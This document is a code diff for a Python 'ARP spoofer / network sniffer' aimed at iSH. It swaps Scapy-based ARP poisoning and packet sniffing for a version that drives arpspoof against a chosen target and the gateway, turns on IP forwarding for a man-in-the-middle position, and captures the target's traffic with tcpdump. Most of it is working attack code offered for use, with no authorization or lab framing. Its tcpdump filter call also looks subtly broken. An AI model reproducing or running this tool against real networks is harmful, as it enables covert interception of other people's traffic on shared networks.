@@ -12,31 +12,7 @@ import ipaddress
 import concurrent.futures
 from datetime import datetime
 
-# Fix for Scapy on iSH - import in a specific way
-import scapy.config
-import scapy.route
-
-# Now try to import scapy modules with error handling
-SCAPY_AVAILABLE = False
-try:
-    # Set Scapy to use minimal configuration
-    import scapy.all
-    from scapy.all import ARP, Ether, sendp, srp
-    from scapy.arch import get_if_hwaddr, get_if_addr
-    
-    # Try to import sniff separately (might fail)
-    try:
-        from scapy.all import sniff
-    except:
-        sniff = None
-    
-    SCAPY_AVAILABLE = True
-    print("✓ Scapy imported successfully")
-except Exception as e:
-    print(f"⚠ Scapy import warning: {e}")
-    SCAPY_AVAILABLE = False
-
-# Try to import requests
+# Try to import requests (pure Python, should work)
 try:
     import requests
     REQUESTS_AVAILABLE = True
@@ -56,10 +32,10 @@ class Colors:
     UNDERLINE = '\033[4m'
 
 def get_available_interfaces():
-    """Get network interfaces without psutil"""
+    """Get network interfaces using system commands"""
     interfaces = []
     
-    # Method 1: Try using /proc/net/dev (Linux)
+    # Try using /proc/net/dev
     try:
         with open('/proc/net/dev', 'r') as f:
             for line in f:
@@ -72,7 +48,7 @@ def get_available_interfaces():
     except:
         pass
     
-    # Method 2: Try using ip command
+    # Try using ip command
     try:
         output = subprocess.check_output(['ip', 'link', 'show'], text=True)
         for line in output.splitlines():
@@ -85,25 +61,10 @@ def get_available_interfaces():
     except:
         pass
     
-    # Method 3: Try using ifconfig
-    try:
-        output = subprocess.check_output(['ifconfig'], text=True)
-        for line in output.splitlines():
-            if line and not line.startswith(' ') and 'flags=' in line:
-                iface = line.split(':')[0]
-                if iface != 'lo' and iface not in interfaces:
-                    interfaces.append(iface)
-        if interfaces:
-            return interfaces
-    except:
-        pass
-    
-    # Fallback to common interface names
-    common_ifaces = ['eth0', 'wlan0', 'en0']
-    return [iface for iface in common_ifaces if os.path.exists(f'/sys/class/net/{iface}')]
+    return []
 
 def get_default_interface():
-    """Get default interface without psutil"""
+    """Get default interface"""
     interfaces = get_available_interfaces()
     if not interfaces:
         return ''
@@ -123,19 +84,6 @@ def get_default_interface():
     except:
         pass
     
-    # Try route command
-    try:
-        output = subprocess.check_output(['route', '-n'], text=True)
-        for line in output.splitlines():
-            if line.startswith('0.0.0.0'):
-                parts = line.split()
-                if len(parts) >= 8:
-                    iface = parts[-1]
-                    if iface in interfaces:
-                        return iface
-    except:
-        pass
-    
     return interfaces[0] if interfaces else ''
 
 def get_local_ip():
@@ -152,14 +100,19 @@ def get_local_ip():
 def guess_net(ip, prefix=24):
     return str(ipaddress.ip_network(f'{ip}/{prefix}', strict=False))
 
-def arp_scan_subprocess(cidr):
-    """ARP scan using system arping command (no Scapy)"""
+def arp_scan_with_arping(cidr):
+    """Scan network using arping command"""
     try:
         net = ipaddress.ip_network(cidr, strict=False)
-        hosts = [str(ip) for ip in net.hosts()][:255]
+        hosts = [str(ip) for ip in net.hosts()][:255]  # Limit to /24
         
         results = []
-        for ip in hosts:
+        print(f"  Scanning {len(hosts)} hosts...")
+        
+        for i, ip in enumerate(hosts):
+            if i % 10 == 0:
+                print(f"  Progress: {i}/{len(hosts)}", end='\r')
+            
             try:
                 # Try arping
                 cmd = ['arping', '-c', '1', '-w', '1', ip]
@@ -167,6 +120,7 @@ def arp_scan_subprocess(cidr):
                 
                 # Extract MAC from output
                 for line in output.decode().splitlines():
+                    # Look for MAC address pattern
                     mac_match = re.search(r'\[([0-9a-f:]{17})\].*?(\d+\.\d+\.\d+\.\d+)', line.lower())
                     if mac_match:
                         mac = mac_match.group(1)
@@ -175,11 +129,14 @@ def arp_scan_subprocess(cidr):
             except:
                 pass
         
+        print()  # New line after progress
         return results
     except Exception as e:
+        print(f"  ARPing scan error: {e}")
         return []
 
 def ping_once(ip):
+    """Ping a single IP"""
     cmd = ['ping', '-c', '1', '-W', '1', ip]
     try:
         subprocess.check_output(cmd, stderr=subprocess.DEVNULL, timeout=2)
@@ -187,37 +144,8 @@ def ping_once(ip):
     except:
         return False
 
-def parse_arp_table():
-    """Parse ARP table"""
-    entries = []
-    try:
-        # Try ip neigh command
-        out = subprocess.check_output(['ip', 'neigh'], text=True, stderr=subprocess.DEVNULL)
-        for line in out.splitlines():
-            parts = line.split()
-            if len(parts) >= 4 and parts[2] == 'lladdr':
-                ip = parts[0]
-                mac = parts[3].lower()
-                entries.append({'ip': ip, 'mac': mac})
-    except:
-        pass
-    
-    if not entries:
-        try:
-            # Try arp command
-            out = subprocess.check_output(['arp', '-n'], text=True, stderr=subprocess.DEVNULL)
-            for line in out.splitlines():
-                m = re.search(r'(\d+\.\d+\.\d+\.\d+).*?((?:[0-9a-f]{2}:){5}[0-9a-f]{2})', line, re.I)
-                if m:
-                    ip = m.group(1)
-                    mac = m.group(2).lower()
-                    entries.append({'ip': ip, 'mac': mac})
-        except:
-            pass
-    
-    return entries
-
-def sweep_network_ping(cidr, max_workers=50):
+def ping_sweep(cidr, max_workers=50):
+    """Ping sweep to find alive hosts"""
     try:
         net = ipaddress.ip_network(cidr, strict=False)
         hosts = [str(ip) for ip in net.hosts()]
@@ -235,21 +163,42 @@ def sweep_network_ping(cidr, max_workers=50):
                 except Exception:
                     continue
         
-        arp_entries = parse_arp_table()
-        arp_map = {e['ip']: e['mac'] for e in arp_entries}
-        return [{'ip': ip, 'mac': arp_map.get(ip)} for ip in alive]
-    except Exception as e:
+        return alive
+    except Exception:
         return []
 
-def reverse_dns(ip, timeout=1.5):
+def get_mac_from_arp_table(ip):
+    """Get MAC for IP from ARP table"""
     try:
-        with concurrent.futures.ThreadPoolExecutor(max_workers=1) as ex:
-            fut = ex.submit(socket.gethostbyaddr, ip)
-            try:
-                name = fut.result(timeout=timeout)[0]
-                return name
-            except:
-                return None
+        # Try ip neigh
+        output = subprocess.check_output(['ip', 'neigh'], text=True, stderr=subprocess.DEVNULL)
+        for line in output.splitlines():
+            if ip in line and 'lladdr' in line:
+                parts = line.split()
+                idx = parts.index('lladdr') + 1
+                if idx < len(parts):
+                    return parts[idx].lower()
+    except:
+        pass
+    
+    try:
+        # Try arp -n
+        output = subprocess.check_output(['arp', '-n'], text=True, stderr=subprocess.DEVNULL)
+        for line in output.splitlines():
+            if ip in line:
+                m = re.search(r'((?:[0-9a-f]{2}:){5}[0-9a-f]{2})', line.lower())
+                if m:
+                    return m.group(1)
+    except:
+        pass
+    
+    return None
+
+def reverse_dns(ip):
+    """Reverse DNS lookup"""
+    try:
+        name = socket.gethostbyaddr(ip)[0]
+        return name
     except:
         return None
 
@@ -266,19 +215,6 @@ def get_vendor_from_mac_api(mac):
     except:
         return None
 
-def enrich_entry(entry):
-    ip = entry.get('ip')
-    mac = entry.get('mac')
-    res = {'ip': ip, 'mac': mac, 'hostname': None, 'vendor': None}
-    
-    if ip:
-        res['hostname'] = reverse_dns(ip)
-    
-    if mac:
-        res['vendor'] = get_vendor_from_mac_api(mac)
-    
-    return res
-
 class ARPSpoofer:
     def __init__(self):
         self.stop_event = threading.Event()
@@ -293,10 +229,9 @@ class ARPSpoofer:
             'sniff_all': False,
             'protocols': ['HTTP', 'TCP', 'UDP', 'OTHER']
         }
-        self.local_mac = None
         self.local_ip = None
-        self.attack_thread = None
-        self.capture_thread = None
+        self.local_mac = None
+        self.capture_process = None
         self.packet_count = 0
         
     def clear_screen(self):
@@ -308,15 +243,10 @@ class ARPSpoofer:
 ╔══════════════════════════════════════════════════════════╗
 ║                 ARP SPOOFER / NETWORK SNIFFER            ║
 ║                      iSH Compatible Version              ║
+║                   (Using System Commands)                ║
 ╚══════════════════════════════════════════════════════════╝{Colors.ENDC}
         """
         print(banner)
-        
-        if SCAPY_AVAILABLE:
-            print(f"{Colors.GREEN}✓ Scapy available - Full ARP spoofing & capture{Colors.ENDC}")
-        else:
-            print(f"{Colors.WARNING}⚠ Scapy not available - Limited functionality{Colors.ENDC}")
-            print(f"{Colors.WARNING}  Using ping sweep and arping instead{Colors.ENDC}")
         
         if REQUESTS_AVAILABLE:
             print(f"{Colors.GREEN}✓ Requests available - Vendor lookup enabled{Colors.ENDC}")
@@ -334,15 +264,13 @@ class ARPSpoofer:
             color = Colors.WARNING
         elif level == "ERROR":
             color = Colors.FAIL
-        elif level == "SPOOF":
-            color = Colors.BLUE
         else:
             color = Colors.ENDC
         
         print(f"{color}[{timestamp}] [{level}] {message}{Colors.ENDC}")
     
     def get_iface_info(self, iface):
-        """Get interface info without scapy"""
+        """Get interface info"""
         mac = None
         ip = None
         
@@ -368,9 +296,8 @@ class ARPSpoofer:
     def detect_gateway(self):
         """Detect gateway IP"""
         try:
-            # Try ip route
-            result = subprocess.check_output(['ip', 'route'], text=True)
-            for line in result.splitlines():
+            output = subprocess.check_output(['ip', 'route'], text=True)
+            for line in output.splitlines():
                 if 'default via' in line:
                     parts = line.split()
                     gw_idx = parts.index('via') + 1
@@ -379,25 +306,6 @@ class ARPSpoofer:
         except:
             pass
         
-        # Try route -n
-        try:
-            result = subprocess.check_output(['route', '-n'], text=True)
-            for line in result.splitlines():
-                if line.startswith('0.0.0.0'):
-                    parts = line.split()
-                    if len(parts) >= 2:
-                        return parts[1]
-        except:
-            pass
-        
-        return None
-
-    def find_mac_for_ip(self, ip):
-        """Find MAC for IP using ARP table"""
-        entries = parse_arp_table()
-        for entry in entries:
-            if entry['ip'] == ip:
-                return entry['mac']
         return None
     
     def detect_network(self):
@@ -421,7 +329,7 @@ class ARPSpoofer:
             self.config['gateway_ip'] = gw_ip
             print(f"  Gateway IP: {Colors.GREEN}{gw_ip}{Colors.ENDC}")
             
-            gw_mac = self.find_mac_for_ip(gw_ip)
+            gw_mac = get_mac_from_arp_table(gw_ip)
             if gw_mac:
                 self.config['gateway_mac'] = gw_mac
                 print(f"  Gateway MAC: {Colors.GREEN}{gw_mac}{Colors.ENDC}")
@@ -431,8 +339,8 @@ class ARPSpoofer:
             print(f"  Gateway IP: {Colors.WARNING}Not detected{Colors.ENDC}")
         print()
     
-    def scan_ip_targets(self):
-        """Scan for targets on the network"""
+    def scan_network(self):
+        """Scan network for devices"""
         if not self.local_ip:
             self.local_ip = get_local_ip()
             if not self.local_ip:
@@ -442,33 +350,19 @@ class ARPSpoofer:
         cidr = guess_net(self.local_ip, prefix=24)
         self.print_status(f"Scanning network: {cidr}", "INFO")
         
-        results = []
-        
-        # Try different scanning methods
-        try:
-            # First try arping (system tool)
-            results = arp_scan_subprocess(cidr)
-            if results:
-                self.print_status(f"ARPing scan: {len(results)} hosts found", "SUCCESS")
-        except:
-            pass
+        # Try ARPing scan first
+        results = arp_scan_with_arping(cidr)
         
         if not results:
-            # Fallback to ping sweep
-            results = sweep_network_ping(cidr)
-            self.print_status(f"Ping sweep: {len(results)} hosts found", "INFO")
+            self.print_status("ARPing failed, trying ping sweep...", "WARNING")
+            alive_ips = ping_sweep(cidr)
+            
+            for ip in alive_ips:
+                mac = get_mac_from_arp_table(ip)
+                results.append({'ip': ip, 'mac': mac})
         
-        # Enrich results
-        enriched = []
-        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
-            futures = [ex.submit(enrich_entry, r) for r in results]
-            for fut in concurrent.futures.as_completed(futures):
-                try:
-                    enriched.append(fut.result())
-                except Exception:
-                    pass
-        
-        return sorted(enriched, key=lambda x: x.get('ip') or '')
+        self.print_status(f"Found {len(results)} devices", "SUCCESS")
+        return results
     
     def display_targets(self, targets):
         if not targets:
@@ -479,11 +373,11 @@ class ARPSpoofer:
         print(f"{'ID':<4} {'IP':<16} {'MAC':<18} {'Hostname':<20}")
         print("-" * 60)
         
-        for i, e in enumerate(targets):
-            ip = e.get('ip') or '-'
-            mac = e.get('mac') or '-'
-            hn = (e.get('hostname') or '-')[:18]
-            print(f"{i:<4} {ip:<16} {mac:<18} {hn:<20}")
+        for i, device in enumerate(targets):
+            ip = device.get('ip') or '-'
+            mac = device.get('mac') or '-'
+            hostname = reverse_dns(ip) or '-'
+            print(f"{i:<4} {ip:<16} {mac:<18} {hostname:<20}")
         print()
     
     def validate_ip(self, ip):
@@ -492,9 +386,6 @@ class ARPSpoofer:
             return True
         except:
             return False
-    
-    def validate_mac(self, mac):
-        return bool(re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', mac))
     
     def interactive_config(self):
         self.clear_screen()
@@ -528,24 +419,32 @@ class ARPSpoofer:
         self.detect_network()
         
         # Scan for targets
-        targets = self.scan_ip_targets()
+        targets = self.scan_network()
         
         if targets:
             self.display_targets(targets)
             
             # Mode selection
             print(f"\n{Colors.BOLD}Select mode:{Colors.ENDC}")
-            print("  1. Sniff entire network")
-            print("  2. Target specific device")
+            print("  1. Monitor only (no ARP spoofing)")
+            print("  2. Attempt ARP spoofing (requires arpspoof tool)")
             
-            mode = input(f"\n{Colors.CYAN}Select mode (1-2) [Default: 2]: {Colors.ENDC}").strip()
+            mode = input(f"\n{Colors.CYAN}Select mode (1-2) [Default: 1]: {Colors.ENDC}").strip()
             
-            if mode == "1":
-                self.config['sniff_all'] = True
+            if mode == "2":
+                # Check if arpspoof is installed
+                try:
+                    subprocess.check_output(['which', 'arpspoof'], stderr=subprocess.DEVNULL)
+                    self.config['use_arpspoof'] = True
+                except:
+                    self.print_status("arpspoof not installed. Install with: apk add dsniff", "WARNING")
+                    self.config['use_arpspoof'] = False
+                    mode = "1"
             else:
-                self.config['sniff_all'] = False
-                
-                # Select target
+                self.config['use_arpspoof'] = False
+            
+            if mode == "2" and self.config['use_arpspoof']:
+                # Select target for ARP spoofing
                 while True:
                     try:
                         target_id = input(f"{Colors.CYAN}Select target ID (0-{len(targets)-1}): {Colors.ENDC}").strip()
@@ -553,62 +452,112 @@ class ARPSpoofer:
                             target = targets[int(target_id)]
                             self.config['target_ip'] = target['ip']
                             self.config['target_mac'] = target['mac'] or ''
+                            self.config['sniff_all'] = False
                             break
                         else:
                             print(f"{Colors.FAIL}Invalid target ID{Colors.ENDC}")
                     except ValueError:
                         print(f"{Colors.FAIL}Please enter a number{Colors.ENDC}")
+            else:
+                self.config['sniff_all'] = True
         else:
-            # Manual configuration
-            self.print_status("No targets found - manual mode", "WARNING")
-            
-            mode = input(f"\n{Colors.CYAN}Sniff entire network? (y/n) [y]: {Colors.ENDC}").strip().lower()
-            self.config['sniff_all'] = (mode != 'n')
-            
-            if not self.config['sniff_all']:
-                # Target IP
-                while True:
-                    ip = input(f"{Colors.CYAN}Target IP: {Colors.ENDC}").strip()
-                    if self.validate_ip(ip):
-                        self.config['target_ip'] = ip
-                        break
-                    print(f"{Colors.FAIL}Invalid IP{Colors.ENDC}")
-                
-                # Target MAC
-                mac = input(f"{Colors.CYAN}Target MAC (optional): {Colors.ENDC}").strip()
-                if mac and self.validate_mac(mac):
-                    self.config['target_mac'] = mac
-                
-                # Gateway IP
-                if not self.config['gateway_ip']:
-                    while True:
-                        ip = input(f"{Colors.CYAN}Gateway IP: {Colors.ENDC}").strip()
-                        if self.validate_ip(ip):
-                            self.config['gateway_ip'] = ip
-                            break
-                        print(f"{Colors.FAIL}Invalid IP{Colors.ENDC}")
+            self.config['sniff_all'] = True
+            self.print_status("No targets found - will monitor all traffic", "INFO")
     
-    def arp_poison(self):
-        """ARP spoofing thread"""
-        if not SCAPY_AVAILABLE:
-            self.print_status("Scapy not available - cannot ARP spoof", "ERROR")
+    def start_capture(self):
+        """Start packet capture using tcpdump"""
+        try:
+            # Check if tcpdump is available
+            subprocess.check_output(['which', 'tcpdump'], stderr=subprocess.DEVNULL)
+            
+            # Build tcpdump command
+            cmd = ['tcpdump', '-i', self.config['iface'], '-l', '-n']
+            
+            # Add filters
+            filters = []
+            if not self.config['sniff_all'] and self.config['target_ip']:
+                filters.append(f"host {self.config['target_ip']}")
+            
+            if self.config['protocols']:
+                proto_filters = []
+                if 'TCP' in self.config['protocols']:
+                    proto_filters.append('tcp')
+                if 'UDP' in self.config['protocols']:
+                    proto_filters.append('udp')
+                if 'ICMP' in self.config['protocols']:
+                    proto_filters.append('icmp')
+                if proto_filters:
+                    filters.append('(' + ' or '.join(proto_filters) + ')')
+            
+            if filters:
+                cmd.extend(['-f', ' '.join(filters)])
+            
+            self.print_status(f"Starting tcpdump: {' '.join(cmd)}", "INFO")
+            
+            # Start tcpdump process
+            self.capture_process = subprocess.Popen(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True,
+                bufsize=1
+            )
+            
+            # Read and display packets
+            for line in self.capture_process.stdout:
+                if self.stop_event.is_set():
+                    break
+                self.packet_count += 1
+                timestamp = datetime.now().strftime('%H:%M:%S')
+                print(f"{Colors.GREEN}[{timestamp}] {line.strip()}{Colors.ENDC}")
+                
+        except FileNotFoundError:
+            self.print_status("tcpdump not installed. Install with: apk add tcpdump", "ERROR")
+        except Exception as e:
+            self.print_status(f"Capture error: {e}", "ERROR")
+    
+    def start_arpspoof(self):
+        """Start ARP spoofing using arpspoof tool"""
+        if not self.config.get('use_arpspoof'):
             return
         
         try:
-            target = ARP(op=2, pdst=self.config['target_ip'], hwdst=self.config['target_mac'], psrc=self.config['gateway_ip'])
-            gateway = ARP(op=2, pdst=self.config['gateway_ip'], hwdst=self.config['gateway_mac'], psrc=self.config['target_ip'])
+            # Start arpspoof for target -> gateway
+            cmd1 = ['arpspoof', '-i', self.config['iface'], '-t', 
+                   self.config['target_ip'], self.config['gateway_ip']]
             
-            while not self.stop_event.is_set():
-                sendp(Ether() / target, iface=self.config['iface'], verbose=False)
-                sendp(Ether() / gateway, iface=self.config['iface'], verbose=False)
-                
-                for _ in range(10):
-                    if self.stop_event.is_set():
-                        break
-                    time.sleep(0.1)
+            # Start arpspoof for gateway -> target
+            cmd2 = ['arpspoof', '-i', self.config['iface'], '-t', 
+                   self.config['gateway_ip'], self.config['target_ip']]
+            
+            self.print_status(f"Starting ARP spoofing...", "SPOOF")
+            
+            # Start both arpspoof processes
+            self.arpspoof_process1 = subprocess.Popen(cmd1, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            self.arpspoof_process2 = subprocess.Popen(cmd2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+        except FileNotFoundError:
+            self.print_status("arpspoof not installed. Install with: apk add dsniff", "ERROR")
         except Exception as e:
-            self.print_status(f"ARP spoofing error: {e}", "ERROR")
-
+            self.print_status(f"ARPSpoof error: {e}", "ERROR")
+    
+    def enable_ip_forwarding(self):
+        """Enable IP forwarding"""
+        try:
+            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
+                f.write('1')
+            self.print_status("IP forwarding enabled", "SUCCESS")
+        except:
+            self.print_status("Could not enable IP forwarding", "WARNING")
+    
+    def disable_ip_forwarding(self):
+        """Disable IP forwarding"""
+        try:
+            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
+                f.write('0')
+        except:
+            pass
+    
     def start(self):
         self.clear_screen()
         self.print_banner()
@@ -626,37 +575,27 @@ class ARPSpoofer:
         # Final confirmation
         print(f"\n{Colors.BOLD}Configuration:{Colors.ENDC}")
         print(f"  Interface: {self.config['iface']}")
-        print(f"  Mode: {'Full network sniff' if self.config['sniff_all'] else 'Targeted'}")
-        if not self.config['sniff_all']:
-            print(f"  Target IP: {self.config['target_ip']}")
-            print(f"  Gateway IP: {self.config['gateway_ip']}")
+        print(f"  Mode: {'Monitor all traffic' if self.config['sniff_all'] else f'Target {self.config["target_ip"]}'}")
         
         response = input(f"\n{Colors.CYAN}Start? (y/n): {Colors.ENDC}").strip().lower()
         if response != 'y':
             self.print_status("Aborted", "WARNING")
             sys.exit(0)
         
-        # Start attack
-        self.print_status("Starting...", "INFO")
+        # Enable IP forwarding for MITM
+        if not self.config['sniff_all']:
+            self.enable_ip_forwarding()
+        
+        # Start ARP spoofing if configured
+        if not self.config['sniff_all']:
+            self.start_arpspoof()
+        
+        # Start packet capture
+        self.print_status("Starting packet capture...", "INFO")
         self.stop_event.clear()
         
-        if not self.config['sniff_all'] and SCAPY_AVAILABLE:
-            self.attack_thread = threading.Thread(target=self.arp_poison, daemon=True)
-            self.attack_thread.start()
-        
-        if SCAPY_AVAILABLE:
-            # Try to import sniff here (might work)
-            try:
-                from scapy.all import sniff
-                self.capture_thread = threading.Thread(target=self.packet_capture, daemon=True)
-                self.capture_thread.start()
-                self.print_status("Capture started", "SUCCESS")
-            except:
-                self.print_status("Scapy sniff not available - cannot capture packets", "ERROR")
-                return
-        else:
-            self.print_status("Scapy not available - cannot capture packets", "ERROR")
-            return
+        capture_thread = threading.Thread(target=self.start_capture, daemon=True)
+        capture_thread.start()
         
         print(f"\n{Colors.WARNING}Press Ctrl+C to stop...{Colors.ENDC}\n")
         
@@ -666,50 +605,27 @@ class ARPSpoofer:
         except KeyboardInterrupt:
             self.stop()
     
-    def packet_capture(self):
-        """Packet capture thread"""
-        try:
-            from scapy.all import sniff
-            
-            def packet_handler(pkt):
-                if self.stop_event.is_set():
-                    return
-                
-                if pkt.haslayer('IP'):
-                    src = pkt['IP'].src
-                    dst = pkt['IP'].dst
-                    proto = pkt['IP'].proto
-                    proto_str = {1: 'ICMP', 6: 'TCP', 17: 'UDP'}.get(proto, 'OTHER')
-                    
-                    if proto_str not in self.config['protocols']:
-                        return
-                    
-                    if not self.config['sniff_all'] and self.config['target_ip']:
-                        if src != self.config['target_ip'] and dst != self.config['target_ip']:
-                            return
-                    
-                    info = ''
-                    
-                    if pkt.haslayer('TCP'):
-                        info = f"Port {pkt['TCP'].sport}→{pkt['TCP'].dport}"
-                    elif pkt.haslayer('UDP'):
-                        info = f"Port {pkt['UDP'].sport}→{pkt['UDP'].dport}"
-                    elif pkt.haslayer('ICMP'):
-                        info = f"Type {pkt['ICMP'].type}"
-                    
-                    self.packet_count += 1
-                    timestamp = datetime.now().strftime('%H:%M:%S')
-                    print(f"{Colors.GREEN}[{timestamp}] {src} → {dst} | {proto_str} | {info}{Colors.ENDC}")
-            
-            sniff(iface=self.config['iface'], prn=packet_handler, store=False, stop_filter=lambda x: self.stop_event.is_set())
-        except Exception as e:
-            self.print_status(f"Capture error: {e}", "ERROR")
-    
     def stop(self):
         self.print_status("\nStopping...", "WARNING")
         self.stop_event.set()
+        
+        # Stop arpspoof processes
+        if hasattr(self, 'arpspoof_process1'):
+            self.arpspoof_process1.terminate()
+        if hasattr(self, 'arpspoof_process2'):
+            self.arpspoof_process2.terminate()
+        
+        # Stop tcpdump
+        if self.capture_process:
+            self.capture_process.terminate()
+        
+        # Disable IP forwarding
+        self.disable_ip_forwarding()
+        
         time.sleep(1)
         self.print_status(f"Packets captured: {self.packet_count}", "SUCCESS")
+        self.print_status("ARP tables may need manual restoration", "WARNING")
+        self.print_status("Run: ip neigh flush all", "INFO")
 
 if __name__ == '__main__':
     spoofer = ARPSpoofer()
